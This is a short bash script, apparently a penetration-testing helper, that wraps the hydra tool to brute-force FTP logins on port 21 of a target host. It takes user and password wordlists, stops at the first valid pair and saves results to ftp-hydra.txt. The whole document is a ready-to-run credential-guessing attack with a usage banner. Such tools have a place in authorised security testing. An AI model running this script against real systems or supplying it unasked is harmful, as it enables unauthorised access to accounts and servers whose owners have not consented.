#!/bin/bash
if [ $# -ne 3 ]; then
    echo "[*] FTP login brute force"
    echo "[*] Usage : $0 <target> <user.lst> <pass.lst>"
    exit 0
fi

hydra -L $2 -P $3 -f -o ftp-hydra.txt -u $1 -s 21 ftp
